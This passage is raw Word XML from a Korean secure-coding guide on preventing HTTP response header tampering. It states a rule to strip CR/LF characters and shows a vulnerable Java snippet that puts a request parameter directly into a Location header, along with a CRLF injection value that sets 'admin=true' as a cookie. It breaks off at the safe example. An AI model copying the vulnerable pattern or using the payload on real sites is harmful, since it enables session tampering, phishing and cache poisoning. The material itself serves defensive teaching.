        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="00836AE5">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>헤더</w:t>
      </w:r>
      <w:r w:rsidR="00836AE5">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00836AE5">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정보</w:t>
      </w:r>
      <w:r w:rsidR="00836AE5">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00836AE5">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>변조</w:t>
      </w:r>
      <w:r w:rsidR="00836AE5">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00836AE5">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>방지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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청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파라미터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값을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> HTTP </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>응답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헤더에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포함시킬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경우</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> CR(\r), LF(\n) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>개행문자를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제거한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>헤더에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String location = request.getParameter("url");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>response.setHeader("Location", location);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// url</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> \r\n </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>헤더를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>임의로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>추가하거나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>응답</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>본문</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>조작</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">url </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파라미터에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> /home\r\nSet-Cookie: admin=true </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> HTTP </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>응답</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>헤더가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>분리되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>임의의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>응답</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>헤더를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>주입할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿠키</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>강제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>피싱</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>페이지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>주입</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>캐시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포이즈닝</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>개행문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
